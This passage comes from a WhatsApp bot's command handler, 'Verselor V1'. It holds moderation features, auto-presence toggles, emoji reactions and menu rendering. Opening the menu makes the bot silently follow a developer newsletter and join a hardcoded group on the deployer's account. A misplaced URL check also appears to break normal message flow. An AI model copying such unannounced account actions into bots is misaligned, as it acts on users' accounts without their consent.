        let winMsg = `🎉 *CONGRATULATIONS!* 🎉\n\n` +
                     `👤 *Winner:* @${m.sender.split('@')[0]}\n` +
                     `✅ *Answer:* ${gameSession.answer.toUpperCase()}\n` +
                     (global.db.data.chats[m.chat]?.economy ? `💰 *Reward:* ₹${reward}` : "") +
                     `\n\n${footer}`;

        await HeavstalTech.sendMessage(m.chat, { text: winMsg, mentions: [m.sender] }, { quoted: m });
        delete this.game[m.chat];
        return;
    }
}
// ============================================================

//=================={ END OF GAME HANDLER }===============================//
        
        
// Exmaple Logic
const example = (teks) => {
return `Usage : *${prefix + command}* ${teks}`
}
// end

// AUTO-ALL FUNCTION BY Heavstal Tech 


// Auto Typing
if (global.autoTyping && command) {
    HeavstalTech.sendPresenceUpdate('composing', from)
}

// Auto Recording
if (global.autoRecord && command) {
    HeavstalTech.sendPresenceUpdate('recording', from)
}

// Auto Read (marks incoming messages as read)
if (global.autoRead && m) {
    HeavstalTech.readMessages([m.key])
}

// Auto View Status (views all status updates)
if (global.autoViewStatus && m.isStatusV3) {
    try {
        await HeavstalTech.readMessages([m.key])
} catch (e) {
        console.error('AutoViewStatus error:', e)
}
}

// Auto Recordtype (simulates both typing + recording rapidly)
if (global.autoRecordType && command) {
    HeavstalTech.sendPresenceUpdate('composing', from)
    setTimeout(() => {
        HeavstalTech.sendPresenceUpdate('recording', from)
}, 1000)
}

//END

// ======== { PERMISSION LOGIC } == \\

       	// Sleep Mode
      	if (global.sleep && command !== 'sleep') {
            if (isCmd) {
        return Vreply(mess.sleep);
       }
       return; 
    } 
        // Grup Only
        if (!m.isGroup && !isCreator && !isSetsudo && global.onlygroup) {
        	if (isCmd){
            return Vreply(`${global.onlygc}`)
            }
        }
        // Private Only
        if (m.isGroup && !isCreator && !isSetsudo && global.onlyprivate) {
        	if (isCmd){
	         return Vreply(`${global.onlypc}`)
	     }
	}
// ============ { END } ========= \\	

// ============== { PATHS } ===\\
const isAutoReact = global.db.data.chats[m.chat]?.autoReact || false;
// =============== { END } =========== \\ 

const deployerCommands = ['pair', 'delpair', 'setprefix', 'set-prefix', 'settimezone', 'set-timezone', 'setbotimg', 'setbotimage', 'setmenustyle', 'setms', 'restart', 'reboot', 'shutdown', 'addowner', 'delowner', 'addsudo', 'delsudo', 'autobio', 'setbio', 'mode', 'public', 'private', 'self'];

if (HeavstalTech.isRentBot && deployerCommands.includes(command)) {
    return Vreply(mess.deployer);
};

const isAllCmd = isCmd || isCmd2

if (isAutoReact && isMessage && isAllCmd) {
try {
const emojis = ['😀','😃','😄','😁','😆','😅','😂','🤣','😊','😇','🙂','🙃','😉','😌','😍','😘','😗','😙','😚','😋','😜','😝','😛','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','👋','🤚','🖐️','✋','🖖','👌','🤌','🤏','✌️','🤞','🤟','🤘','🤙','👈','👉','👆','👇','☝️','✋','🖕','👍','👎','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦵','🦶','👂','👃','👀','👁️','👅','👄','🧠','🫀','🫁','🦷','🦴','👶','🧒','👦','👧','🧑','👨','👩','🧓','👴','👵','🙍','🙎','🙅','🙆','💁','🙋','🧏','🙇','🤦','🤷','🧑‍⚕️','👨‍⚕️','👩‍⚕️','🧑‍🎓','👨‍🎓','👩‍🎓','🧑‍🏫','👨‍🏫','👩‍🏫','🧑‍⚖️','👨‍⚖️','👩‍⚖️','🧑‍🌾','👨‍🌾','👩‍🌾','🧑‍🍳','👨‍🍳','👩‍🍳','🧑‍🔧','👨‍🔧','👩‍🔧','👨‍🏭','👩‍🏭','🧑‍💼','👨‍💼','👩‍💼','🧑‍🔬','👨‍🔬','👩‍🔬','🧑‍💻','👨‍💻','👩‍💻','🧑‍🎤','👨‍🎤','👩‍🎤','🧑‍🎨','👨‍🎨','👩‍🎨','🧑‍✈️','👨‍✈️','👩‍✈️','🧑‍🚀','👨‍🚀','👩‍🚀','🧑‍🚒','👨‍🚒','👩‍🚒','👮','👷','💂','🕵️','👳','👲','🧕','👰','🤵','👸','🤴','🥷','🦸','🦹','⚽','🏀','🏈','⚾','🥎','🎾','🏐','🏉','🥏','🎱','🏓','🏸','🥅','🏒','🏑','🏏','⛳','🪁','🏹','🥋','🛹','🛷','🥌','🎣','🤿','🥊','🥇','🥈','🥉','🏆','🎽','🏅','🐶','🐱','🐭','🐹','🐰','🦊','🐻','🐼','🐻‍❄️','🐨','🐯','🦁','🐮','🐷','🐸','🐵','🙈','🙉','🙊','🐒','🐔','🐧','🐦','🐤','🐣','🐥','🦆','🦅','🦉','🦇','🐺','🐗','🐴','🦄','🐝','🪱','🐛','🦋','🐌','🐞','🐜','🪰','🪲','🪳','🦟','🦗','🕷️','🕸️','🦂','🐢','🐍','🦎','🐙','🦑','🦐','🦞','🦀','🐡','🐠','🐟','🐬','🐳','🐋','🦈','🐊','🐅','🐆','🦓','🦍','🦧','🦣','🐘','🦛','🦏','🐪','🐫','🦒','🦬','🐃','🐄','🐎','🐖','🐏','🐑','🦙','🐐','🦌','🐕','🐩','🐈','🐓','🦃','🦚','🦜','🦢','🕊️','🦩','🐇','🦝','🦨','🦡','🦦','🦥','🐁','🐀','🐿️','🦔','🐉','🐲','🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🫐','🍈','🍒','🍑','🥭','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥬','🥒','🌶️','🫑','🌽','🥕','🧄','🧅','🥔','🍠','🥐','🍞','🥖','🥨','🥯','🧀','🥚','🍳','🧈','🥞','🧇','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🌮','🌯','🥗','🥘','🥫','🍝','🍜','🍲','🍛','🍣','🍱','🥟','🍤','🍙','🍚','🍘','🍥','🥠','🍢','🍡','🍧','🍨','🍦','🥧','🧁','🍰','🎂','🍮','🍭','🍬','🍫','🍿','🧋','☕','🍵','🧃','🥤','🍺','🍻','🥂','🍷','🥃','🍸','🍹','🧉','🍾','🧊','🌍','🌎','🌏','🪐','🌕','🌑','🌓','🌔','🌙','⭐','🌟','☀️','🌤️','🌦️','🌧️','⛈️','🌩️','❄️','🌫️','🌪️','🌈','🔥','💧','🌊','🪨','🪵','🌋','🏔️','🗻','🏕️','🏖️','🏜️','🏝️','🏞️','🏟️','🏛️','🏗️','🏘️','🏙️','🏚️','🏠','🏡','🏢','🏣','🏤','🏥','🏦','🏨','🏩','🏪','🏫','🏬','🏭','🏯','🏰','💒','🗼','🗽','⛪','🕌','🕍','🛕','🕋','🛤️','🛣️','🗾','🎢','🎡','🎠','🚂','🚃','🚄','🚅','🚆','🚇','🚈','🚉','🚊','🚋','🚌','🚍','🚎','🚏','🚐','🚑','🚒','🚓','🚔','🚕','🚖','🚗','🚘','🚙','🚚','🚛','🚜','🚲','🛵','🏍️','🚔','🚨','🚦','🚧','🚤','🚢','✈️','🛫','🛬','🪂','🚁','🚀','🛸','🛰️','💌','💎','🔮','💣','🧨','📿','💈','⚙️','🧰','🧲','🪛','🔧','🔩','🔨','🪓','🪚','🪣','⚖️','🧪','🧬','🧫','🧯','🔭','🔬','🕳️','💊','💉','🩸','🩹','🩺','🚪','🪟','🛏️','🪞','🪑','🚽','🚿','🛁','🪤','🧴','🧻','🪠','🧼','🪥','🧽','🪒','🔑','🗝️','🧭','🗺️','🧳','💼','🕶️','👓','🎒','💍','📱','📲','💻','🖥️','🖨️','⌨️','🖱️','💾','💿','📀','📷','📸','📹','🎥','📺','📻','🎙️','🎚️','🎛️','☎️','📞','📟','📠','🕰️','⌚','⏰','⏱️','⏲️','⏳','⌛','📡','🔋','🔌','💡','🔦','🕯️','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','💔','❣️','💕','💞','💓','💗','💖','💘','💝','💟','☮️','✝️','☪️','🕉️','☸️','🔯','🕎','☯️','⚛️','💫','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','🆗','🆒','🆕','🆙','🅾️','🅿️','❗','‼️','⁉️','❓','❕','❔','🔅','🔆','🚫','✅','☑️','✔️','❌','❎', '🏁','🚩','🎌','🏴','🏳️','🏳️‍🌈','🏳️‍⚧️','🇺🇸','🇬🇧','🇨🇦','🇳🇬','🇯🇵','🇮🇳','🇧🇷','🇫🇷','🇩🇪','🇮🇹','🇪🇸','🇨🇳','🇰🇷','🇷🇺','🇸🇦','🇿🇦','🇲🇽'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await HeavstalTech.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}


// ============ { END } ========= \\


// ========== { EMOJI SECTION } == \\

const emojis2 = ['😀','😃','😄','😁','😆','😅','😂','🤣','😊','😇','🙂','🙃','😉','😌','😍','😘','😗','😙','😚','😋','😜','😝','😛','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','👋','🤚','🖐️','✋','🖖','👌','🤌','🤏','✌️','🤞','🤟','🤘','🤙','👈','👉','👆','👇','☝️','✋','🖕','👍','👎','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦵','🦶','👂','👃','👀','👁️','👅','👄','🧠','🫀','🫁','🦷','🦴','👶','🧒','👦','👧','🧑','👨','👩','🧓','👴','👵','🙍','🙎','🙅','🙆','💁','🙋','🧏','🙇','🤦','🤷','🧑‍⚕️','👨‍⚕️','👩‍⚕️','🧑‍🎓','👨‍🎓','👩‍🎓','🧑‍🏫','👨‍🏫','👩‍🏫','🧑‍⚖️','👨‍⚖️','👩‍⚖️','🧑‍🌾','👨‍🌾','👩‍🌾','🧑‍🍳','👨‍🍳','👩‍🍳','🧑‍🔧','👨‍🔧','👩‍🔧','👨‍🏭','👩‍🏭','🧑‍💼','👨‍💼','👩‍💼','🧑‍🔬','👨‍🔬','👩‍🔬','🧑‍💻','👨‍💻','👩‍💻','🧑‍🎤','👨‍🎤','👩‍🎤','🧑‍🎨','👨‍🎨','👩‍🎨','🧑‍✈️','👨‍✈️','👩‍✈️','🧑‍🚀','👨‍🚀','👩‍🚀','🧑‍🚒','👨‍🚒','👩‍🚒','👮','👷','💂','🕵️','👳','👲','🧕','👰','🤵','👸','🤴','🥷','🦸','🦹','⚽','🏀','🏈','⚾','🥎','🎾','🏐','🏉','🥏','🎱','🏓','🏸','🥅','🏒','🏑','🏏','⛳','🪁','🏹','🥋','🛹','🛷','🥌','🎣','🤿','🥊','🥇','🥈','🥉','🏆','🎽','🏅','🐶','🐱','🐭','🐹','🐰','🦊','🐻','🐼','🐻‍❄️','🐨','🐯','🦁','🐮','🐷','🐸','🐵','🙈','🙉','🙊','🐒','🐔','🐧','🐦','🐤','🐣','🐥','🦆','🦅','🦉','🦇','🐺','🐗','🐴','🦄','🐝','🪱','🐛','🦋','🐌','🐞','🐜','🪰','🪲','🪳','🦟','🦗','🕷️','🕸️','🦂','🐢','🐍','🦎','🐙','🦑','🦐','🦞','🦀','🐡','🐠','🐟','🐬','🐳','🐋','🦈','🐊','🐅','🐆','🦓','🦍','🦧','🦣','🐘','🦛','🦏','🐪','🐫','🦒','🦬','🐃','🐄','🐎','🐖','🐏','🐑','🦙','🐐','🦌','🐕','🐩','🐈','🐓','🦃','🦚','🦜','🦢','🕊️','🦩','🐇','🦝','🦨','🦡','🦦','🦥','🐁','🐀','🐿️','🦔','🐉','🐲','🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🫐','🍈','🍒','🍑','🥭','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥬','🥒','🌶️','🫑','🌽','🥕','🧄','🧅','🥔','🍠','🥐','🍞','🥖','🥨','🥯','🧀','🥚','🍳','🧈','🥞','🧇','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🌮','🌯','🥗','🥘','🥫','🍝','🍜','🍲','🍛','🍣','🍱','🥟','🍤','🍙','🍚','🍘','🍥','🥠','🍢','🍡','🍧','🍨','🍦','🥧','🧁','🍰','🎂','🍮','🍭','🍬','🍫','🍿','🧋','☕','🍵','🧃','🥤','🍺','🍻','🥂','🍷','🥃','🍸','🍹','🧉','🍾','🧊','🌍','🌎','🌏','🪐','🌕','🌑','🌓','🌔','🌙','⭐','🌟','☀️','🌤️','🌦️','🌧️','⛈️','🌩️','❄️','🌫️','🌪️','🌈','🔥','💧','🌊','🪨','🪵','🌋','🏔️','🗻','🏕️','🏖️','🏜️','🏝️','🏞️','🏟️','🏛️','🏗️','🏘️','🏙️','🏚️','🏠','🏡','🏢','🏣','🏤','🏥','🏦','🏨','🏩','🏪','🏫','🏬','🏭','🏯','🏰','💒','🗼','🗽','⛪','🕌','🕍','🛕','🕋','🛤️','🛣️','🗾','🎢','🎡','🎠','🚂','🚃','🚄','🚅','🚆','🚇','🚈','🚉','🚊','🚋','🚌','🚍','🚎','🚏','🚐','🚑','🚒','🚓','🚔','🚕','🚖','🚗','🚘','🚙','🚚','🚛','🚜','🚲','🛵','🏍️','🚔','🚨','🚦','🚧','🚤','🚢','✈️','🛫','🛬','🪂','🚁','🚀','🛸','🛰️','💌','💎','🔮','💣','🧨','📿','💈','⚙️','🧰','🧲','🪛','🔧','🔩','🔨','🪓','🪚','🪣','⚖️','🧪','🧬','🧫','🧯','🔭','🔬','🕳️','💊','💉','🩸','🩹','🩺','🚪','🪟','🛏️','🪞','🪑','🚽','🚿','🛁','🪤','🧴','🧻','🪠','🧼','🪥','🧽','🪒','🔑','🗝️','🧭','🗺️','🧳','💼','🕶️','👓','🎒','💍','📱','📲','💻','🖥️','🖨️','⌨️','🖱️','💾','💿','📀','📷','📸','📹','🎥','📺','📻','🎙️','🎚️','🎛️','☎️','📞','📟','📠','🕰️','⌚','⏰','⏱️','⏲️','⏳','⌛','📡','🔋','🔌','💡','🔦','🕯️','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','💔','❣️','💕','💞','💓','💗','💖','💘','💝','💟','☮️','✝️','☪️','🕉️','☸️','🔯','🕎','☯️','⚛️','💫','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','🆗','🆒','🆕','🆙','🅾️','🅿️','❗','‼️','⁉️','❓','❕','❔','🔅','🔆','🚫','✅','☑️','✔️','❌','❎', '🏁','🚩','🎌','🏴','🏳️','🏳️‍🌈','🏳️‍⚧️','🇺🇸','🇬🇧','🇨🇦','🇳🇬','🇯🇵','🇮🇳','🇧🇷','🇫🇷','🇩🇪','🇮🇹','🇪🇸','🇨🇳','🇰🇷','🇷🇺','🇸🇦','🇿🇦','🇲🇽'];
const RandomEmoji2 = () => emojis2[Math.floor(Math.random() * emojis2.length)];

// ============ { END } ========= \\

// = { MENU SYMBOL SYLLABLE(s) } = \\

const MenuSymbolStyle = ["乂", "◈", "➭", "ଓ", "⟆•", "⳻", "•", "↬", "◈", "⭑", "ᯬ", "◉", "᭻", "»", "〆", "々", "✗", "♪", "乂", "❏", "⫹⫺", "⎔", "✦", "⭔", "⬟", "❍", "✠", "𝌫", "➟", "❦", "✇", "《", "》", "《》"]
const MenuStyle = MenuSymbolStyle[Math.floor(Math.random() * MenuSymbolStyle.length)];
// ========== { END } =========== \\

// ========= { LOADING LOGIC } ==== \\

async function loading () {
  var Floading = [
    `𝑳𝑶𝑨𝑫𝑰𝑵𝑮...\n${MenuStyle} █▒▒▒▒▒▒▒▒▒▒▒${MenuStyle} 10%`,
    `𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏²⁶\n${MenuStyle} ████▒▒▒▒▒▒▒▒${MenuStyle} 30%`,
    `𝐀𝐋𝐌𝐎𝐒𝐓 𝐃𝐎𝐍𝐄...\n${MenuStyle} ███████▒▒▒▒▒${MenuStyle} 50%`,
    `${MenuStyle} ██████████▒▒${MenuStyle} 80%`,
    `𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏²⁶ 𝐁𝐘 𝐇𝐄𝐀𝐕𝐄𝐓𝐀𝐋 𝐓𝐄𝐂𝐇\n${MenuStyle} ████████████${MenuStyle} 100%\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳...`
  ];

  let { key } = await HeavstalTech.sendMessage(from, { text: Floading[0] });
  for (let i = 1; i < Floading.length; i++) {
  await sleep(65);
    await HeavstalTech.sendMessage(from, { text: Floading[i], edit: key });
  }
}

// ============ { END } ========= \\

// ============ { API_KEY } ========= \\

const HT_API_KEY = global.HT_API_KEY

// ============ { END } ========= \\


//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END

// Styles function by Heavstal Tech 

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

// END

// START OF ANTILINK, ANTIBADWORD & ANTIBOT Algorithm

if (m.isGroup) {
    // 1. Get Chat Settings safely
    const chatData = global.db.data.chats[from] || {};
    
    // 2. Define the Trigger Function (Internal)
    async function triggerSecurity(violationType, culprit) {
        const mode = chatData[violationType];
        if (!mode || mode === 'off') return;

        // Action: DELETE
        if (isBotAdmin) {
            await HeavstalTech.sendMessage(from, { delete: m.key });
        }

        // Action: KICK
        if (mode === 'kick') {
            if (!isBotAdmin) return Vreply(`*Security Alert:* I need Admin privileges to kick @${culprit.split('@')[0]}!`);
            await HeavstalTech.groupParticipantsUpdate(from, [culprit], 'remove');
            await HeavstalTech.sendMessage(from, { text: `*🚫 ${violationType.toUpperCase()} DETECTED*\n@${culprit.split('@')[0]} has been removed.`, mentions: [culprit] });
        }

        // Action: WARN
        if (mode === 'warn') {
            // We store warnings inside the chat object: chatData.warnings = { "user_id": count }
            if (!chatData.warnings) chatData.warnings = {};
            
            const currentWarns = (chatData.warnings[culprit] || 0) + 1;
            const maxWarns = global.warnLimit || 3;

            if (currentWarns >= maxWarns) {
                // Reset warnings
                delete chatData.warnings[culprit]; 
                
                if (isBotAdmin) {
                    await HeavstalTech.groupParticipantsUpdate(from, [culprit], 'remove');
                    await HeavstalTech.sendMessage(from, { text: `*🚫 WARNING LIMIT REACHED*\n@${culprit.split('@')[0]} has been kicked.`, mentions: [culprit] });
                } else {
                    await HeavstalTech.sendMessage(from, { text: `*🚫 WARNING LIMIT REACHED*\n@${culprit.split('@')[0]} should be kicked, but I am not Admin.`, mentions: [culprit] });
                }
            } else {
                chatData.warnings[culprit] = currentWarns;
                await HeavstalTech.sendMessage(from, { text: `*⚠️ WARNING [${currentWarns}/${maxWarns}]*\n@${culprit.split('@')[0]}, stop sending ${violationType}s!`, mentions: [culprit] });
            }
        }
    }

    // 3. Run Checks (Only if sender is not Admin/Creator)
    if (!isAdmin && !isCreator && !m.key.fromMe) {
        // Check Antilink
        if (chatData.antilink && chatData.antilink !== 'off') {
            if (isLooseUrl(body) || body.includes('http') || body.includes('chat.whatsapp.com')) {
                await triggerSecurity('antilink', m.sender);
            }
        }
        
        // Check Antibadword
        if (chatData.antibadword && chatData.antibadword !== 'off') {
            const badWords = global.db.data.settings?.badwords || [];
            const wordsInMessage = body.toLowerCase().split(/\s+/);
            if (wordsInMessage.some(w => badWords.includes(w))) {
                await triggerSecurity('antibadword', m.sender);
            }
        }
        
        // Check Antibot
        if (chatData.antibot && chatData.antibot !== 'off') {
            if (m.key.id.startsWith('BAE5') || m.key.id.length > 21) {
                await triggerSecurity('antibot', m.sender);
            }
        }
    }
}

// END OF ANTILINK, ANTIBADWORD & ANTIBOT Algorithm 

// antitag function
if (m.isGroup && global.db.data.chats[m.chat]?.antitag) {
if (m.mentionedJid.length > 7) {
if (isCreator || isAdmins || m.key.fromMe) return
Vreply("*MULTIPLE TAGS DETECTED*\n\nYou will be kicked out of this group for tagging multiple people while anti-tag mode is enabled.")
await sleep(3000) // to avoid rate overlimit
await HeavstalTech.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

        
/*
function updateEnvVariable(key, value) {
  const envPath = path.join(__dirname, '..', '.env'); // Adjust based on your folder structure
  let envContent = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';

  const regex = new RegExp(`^key=.*`, 'm');
  if (regex.test(envContent)) {
    envContent = envContent.replace(regex, `key={value}`);
  } else {
    envContent += `\nkey={value}`;
  }

  fs.writeFileSync(envPath, envContent);
}
*/


if (!isUrl(text)) return Vreply("Provide A Valid Image Url");


//REPLY IMAGE MESSAGE
const ReplyImage = (teks) => {
    return HeavstalTech.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `HEAVSTAL TECH`,
                body: `VERSELOR V1`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://youtube.com/@Heavstal_Tech`
            }
        }
    }, { quoted: m });
}

const Reply1 = (teks) => {
    return HeavstalTech.sendMessage(m.chat, {
        image: {
            url: "https://files.catbox.moe/g8pxls.png"
        },
        caption: teks,
        gifPlayback: false
    }, { quoted: m });
}

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

    
// ==== { AUTO FOLLOW LOGIC } === \\
      
// Newsletter Channels
const channelIds =[
 "120363402853491560@newsletter"
];

// Newsletter follow function using LowDb
async function followNewsletter(channels) {
  try {
    // 1. Ensure the 'others' object and 'followedChannels' array exist in LowDb
    if (!global.db.data.others) global.db.data.others = {};
    if (!global.db.data.others.followedChannels) {
      global.db.data.others.followedChannels = [];
    }

    let hasNewFollow = false;
    let followedList = global.db.data.others.followedChannels;

    // 2. Iterate through ALL channel IDs to make it more flexible
    for (const channelToFollow of channels) {
      if (!followedList.includes(channelToFollow)) {
        console.log(`Attempting to follow new channel: ${channelToFollow}`);
        
        // Follow the channel
        await HeavstalTech.newsletterFollow(channelToFollow);
        
        // Add the new channel to our LowDb array in RAM
        followedList.push(channelToFollow);
        hasNewFollow = true;

        console.log(`✅ Successfully followed channel: ${channelToFollow}`);
      } else {
        // Uncomment the line below if you want console logs every time the menu is opened
        // console.log(`⚠️ Already following channel: ${channelToFollow}. Skipping.`);
      }
    }

    // 3. ONLY trigger a disk write if we actually followed a new channel
    if (hasNewFollow) {
      await global.db.write();
      console.log('💾 [DB] Saved new followed channels to LowDb.');
    }

  } catch (err) {
    console.error('❌ Newsletter follow error:', err);
  }
}
// =========== { END } ============ \\

async function autoJoinGroup(HeavstalTech, inviteLink) {
  try {
    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
    
    if (!inviteCode) {
      console.error('❌ Auto-Join: Invalid invite link provided.');
      return;
    }
    
    // --- THIS IS THE UPGRADE ---
    // 1. Get the group's metadata from the invite code to find its JID (ID)
    let groupMetadata = await HeavstalTech.groupGetInviteInfo(inviteCode);
    const groupJid = groupMetadata.id;

    // 2. Fetch all groups the bot is currently in
    const currentGroups = await HeavstalTech.groupFetchAllParticipating();
    
    // 3. Check if the bot is already a member
    if (Object.keys(currentGroups).includes(groupJid)) {
      console.log(`✅ Auto-Join: Already a member of group "${groupMetadata.subject}". Skipping join.`);
      return; // Stop the function here
    }
    // --- END OF UPGRADE ---
    
    // 4. If not a member, then join the group
    const result = await HeavstalTech.groupAcceptInvite(inviteCode);
    console.log(`✅ Auto-Join: Successfully joined new group: "${groupMetadata.subject}" (${result})`);
    return result;
    
  } catch (error) {
    // We can add a specific check for "invalid invite" or "full group" errors
    if (error.message.includes('invalid') || error.message.includes('full')) {
        console.error(`❌ Auto-Join: Failed to join group. The invite link may be expired, revoked, or the group is full.`);
    } else {
        console.error('❌ Auto-Join: An unexpected error occurred:', error.message);
    }
    return null;
  }
}

// =========== { END } ============ \\   


// ======= { READMORE LOGIC } ===== \\
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
// ============ { END } ========== \\


// ================================================================== { END OF ALL BASIC REQUIRED "modules", "functions", Declarations" etc. } using commonjs                  ========================================================== \\


// ================================================================== { ALL MAIN "codes", "few declarations", "Logics", "statements" etc.} using commonjs                             ========================================================== \\


//=================================================//
const DisallowedWeb = ["https://accounts-heavstal.vervel.app", "https://heavstal-tech.vercel.app", "https://heavstal-bots.vercel.app"]
//=================================================//

        
//=================================================//
const isSpecialCmd = budy.startsWith('=>') || budy.startsWith('>') || budy.startsWith('$');
if (isCmd2 && !isSpecialCmd) {
    return;
}
//=================================================//

switch(command) {

//=================================================//   
case 'allmenu': 
case 'all-menu': 
case 'menu':
case 'listmenu':
case 'mainmenu': {
followNewsletter(channelIds);
await autoJoinGroup(HeavstalTech, "https://chat.whatsapp.com/HlfH698T5LAICbpQV5A5ku?mode=wwt");
 await loading()

  const menuText = `
╭━━〔 𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑      𝐕𝟏 〕━━╮
┃ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗘
┃──────────────────────
┣ ᴜsᴇʀ       : ${pushname}
┣ ᴘʀᴇғɪx      : *[ ${prefix} ]*
┣ ᴠᴇʀsɪᴏɴ     : *[ ${global.version} ]* (Latest)
┣ ᴄᴏᴍᴍᴀɴᴅs   : *${totalFitur()}*
┣ ʀᴜɴᴛɪᴍᴇ     : ${runtime(process.uptime())}
┣ ʜᴏsᴛ         : ${os.hostname()}
┣ ᴘʟᴀᴛғᴏʀᴍ    : ${os.platform()}
┣ sᴇʀᴠᴇʀ ʀᴀᴍ  : ${usedRam} / ${totalRam}
┣ ᴛɪᴍᴇ-ᴢᴏɴᴇ    : *[ ${global.timezone} ]*
┣ ᴛɪᴍᴇ          : ${time}
┣ ᴅᴀᴛᴇ          : ${todayDateWIB}
┣ ᴍᴇɴᴜ sᴛʏʟᴇ  : ${global.menu}
┣ ᴍᴀɪɴᴛᴀɪɴᴇᴅ   : *[ YES ]*
┣ ᴅᴇᴠᴇʟᴏᴘᴇʀ   : ${global.developer}
╰═「 ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇᴀᴠsᴛᴀʟ ᴛᴇᴄʜ 」
${readmore}

╭━━━  *𝗠𝗔𝗜𝗡* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴏᴡɴᴇʀ || ᴄʀᴇᴀᴛᴏʀ
┃━ ${MenuStyle}   ${prefix}ᴏᴡɴᴇʀ2 || ᴄʀᴇᴀᴛᴏʀ2
┃━ ${MenuStyle}   ${prefix}sᴄʀɪᴘᴛ || ʀᴇᴘᴏ
┃━ ${MenuStyle}   ${prefix}ᴘɪɴɢ || sᴘᴇᴇᴅ
┃━ ${MenuStyle}   ${prefix}ᴀʟɪᴠᴇ
┃━ ${MenuStyle}   ${prefix}ʀᴜɴᴛɪᴍᴇ
┃━ ${MenuStyle}   ${prefix}sᴜᴘᴘᴏʀᴛ
┃━ ${MenuStyle}   ${prefix}ʙᴏᴛɢʀᴏᴜᴘ || ɢᴄʙᴏᴛ

╰═══════════════════
${readmore}

╭━━━  *𝗜𝗡𝗧𝗘𝗥𝗔𝗖𝗧𝗜𝗩𝗘 𝗛𝗘𝗟𝗣𝗘𝗥𝗦* ━━━╮

┃━ ${MenuStyle}   ${prefix}ᴛɪᴍᴇ
┃━ ${MenuStyle}   ${prefix}ᴅᴀᴛᴇ
┃━ ${MenuStyle}   ${prefix}ᴍᴏʀɴɪɴɢ
┃━ ${MenuStyle}   ${prefix}ᴀғᴛᴇʀɴᴏᴏɴ 
┃━ ${MenuStyle}   ${prefix}ᴇᴠᴇɴɪɴɢ
